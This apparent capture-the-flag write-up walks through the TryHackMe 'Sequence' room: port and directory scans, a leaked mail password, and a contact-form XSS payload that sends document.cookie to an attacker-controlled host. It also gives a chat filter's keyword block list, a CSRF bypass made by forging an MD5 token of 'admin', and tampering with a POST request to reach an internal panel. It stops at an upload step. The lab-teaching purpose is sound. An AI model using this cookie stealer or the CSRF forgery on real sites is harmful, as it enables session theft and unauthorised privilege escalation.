[Sequence](https://tryhackme.com/room/sequence) is a machine medium difficulty machine that focuses on chaining multiple vulnerabilities to break into a machine. The machine's description gave us the following:

```
Robert made some last-minute updates to the review.thm website before heading off on vacation. 
He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? 
Your challenge is to exploit the vulnerabilities and gain complete control of the system.
```

Doing a quick Nmap scan running `nmap -A -T4 -v review.thm` gives us:

```
Nmap scan report for review.thm (10.10.125.29)
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Review Shop
```

Heading on over to the website reveals a potential shop which is apparently login only(?) 

![](./images/img1.png)

The contact page may or may not be susceptible to XSS. Let's send a cookie stealer just in case.
```
<img src=x onerror="this.src='http://<attacker ip>:8000/?'+document.cookie;">
```

We'll come back here in a bit. For now, let's do some subdirectory enumeration. I will be using gobuster for this machine.

`gobuster dir -u http://review.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt `

We get some potential results:

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

```


Looking into each directory, I find that 
 * `/uploads` is empty.
 * `/mail` has a file called `dump.txt` which contains the following:
 ```
 From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
 ```
 * `/javascript` returns `403 forbidden`.
 * `/phpmyadmin` is on v4.9.5.
 
Seeing the two PHP files, I decided to restart my gobuster scan with an additional `-x php` parameter, which returned two PHP files: `db.php` and `chat.php`. 

`chat.php` simply redirects us to the login page and `db.php` returns a blank page.

Speaking of login page, our XSS payload returned something.

![](./images/img2.png)

Bingo.

![](./images/img3.png)

Strange how ID #1 is missing. Regardless, our flag is on the top right.

Two interesting finds:

1- the `Chat` page logs us in as the admin and leaks some filter

![](./images/img4.png)

2- the `Settings` page has an option to promote a user to admin

![](./images/img5.png)

(It would be wise to set a new password to maintain persistence)

I put two and two together and figured that maybe we can use the chat to promote our user to admin or at least steal the admins session. Intercepting the `Promote Co-admin` request reveals that it is sending a GET request to `promote_coadmin.php` with a username parameter, as well as a CSRF token.

Looking at the chat source page, I was able to extract the list of banned words: 
```
"<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"
```

Thing is, however, is that this is a red herring.

the message box treats the text as anything but HTML. However, hyperlinks are rendered. Better yet, when I send a link to my python server, I get requests.

So it's simple. Just send a hyperlink pointing towards `promote_coadmin.php` with the appropriate parameters and we get promoted. Right? Sort of.

The problem is that we don't have the admins CSRF token. So we're stuck again. But, the CSRF token struck me as odd.

For context, here is the CSRF token: `ad148a3ca8bd0ef3b48c52454c493ec5`


ad148... Those five characters are familiar. Hell, so was the length. Running the token through a [hash identifier](https://hashes.com/en/tools/hash_identifier), I find that the hash is MD5. Running this hash through [crackstation](https://crackstation.net/):


![](./images/img6.png)

Well I'll be. In that case, let's generate our payload:

`$ echo -n "admin" | md5sum`

`http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3`

Going into home:

![](./images/img7.png)

Brilliant.

Logging out and back in shows us the admin front and gives us our second flag:

![](./images/img8.png)

clicking on the drop down menu reveals a "feature" called "lottery". Clicking on it reveals the followings:\
```
ðŸŽ‰ Coming Soon!

The Lottery feature is in production and will be launched soon. Stay tuned!
```

Recall how our earlier enumerations lead us to an email talking about a lottery and a finance panel. This is where it comes into play.

the drop down menu actually just sends a POST request whenever we click on one of the provided selections. In the case of "lottery", it just sends a POST request with the body containing `lottery.php`. Modifying that to request `finance.php` instead:

![](./images/img9.png)

And after putting in the password:

![](./images/img10.png)

Now, I've tried to upload multiple files here, and it kept telling me that each file was uploaded successfully and located in `/uploads`. However, every time I checked, it was empty.

It's possible that there is a filter, or the `/upload` referenced is a different one. But all of this is pure conjecture.

But wait, let's take a closer look:

![](./images/img11.png)

